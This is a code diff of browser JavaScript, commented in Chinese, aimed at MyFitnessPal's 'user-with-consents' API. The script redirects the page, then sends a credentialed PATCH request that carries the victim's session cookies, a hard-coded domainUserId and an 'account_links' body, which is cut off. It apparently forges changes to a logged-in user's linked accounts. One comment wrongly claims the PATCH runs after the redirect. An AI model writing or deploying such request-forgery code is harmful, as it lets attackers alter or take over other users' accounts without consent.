@@ -5,25 +5,16 @@
 // 目标API地址
 const apiUrl = 'https://www.myfitnesspal.com/api/idm/user-with-consents';
 
-// 1. GET请求：保留请求动作，注释domainUserId提取步骤
-let domainUserId = '';
-const xhrGet = new XMLHttpRequest();
-xhrGet.open('GET', apiUrl, false); // 同步GET请求（保留）
-xhrGet.withCredentials = true;    // 携带登录态Cookie（保留）
-xhrGet.send();                    // 执行GET请求（保留）
-// 提取domainUserId步骤：已注释，暂不解析响应取值
-/* if (xhrGet.status === 200) {
-  const resData = JSON.parse(xhrGet.responseText);
-  domainUserId = resData.domainUserId;
-} */
+// 1. GET请求：通过window.location.href实现强制页面跳转（核心修改，满足跳转要求）
+window.location.href = apiUrl; // 直接跳转至GET接口，浏览器地址栏会变为目标API地址
 
-// 2. PATCH请求：固定domainUserId为1234567890，直接发起请求
-domainUserId = "1234567890"; // 固定赋值为1234567890（覆盖原有空值）
+// 2. 固定domainUserId为1234567890，发起PATCH请求（跳转后执行）
+const domainUserId = "1234567890";
 if (domainUserId) {
   const xhrPatch = new XMLHttpRequest();
   xhrPatch.open('PATCH', apiUrl, true);
-  xhrPatch.withCredentials = true;
-  xhrPatch.setRequestHeader('Content-Type', 'application/json');
+  xhrPatch.withCredentials = true; // 携带登录态Cookie
+  xhrPatch.setRequestHeader('Content-Type', 'application/json'); // 必加，解析JSON请求体
   const requestBody = {
     "account_links": [
       {
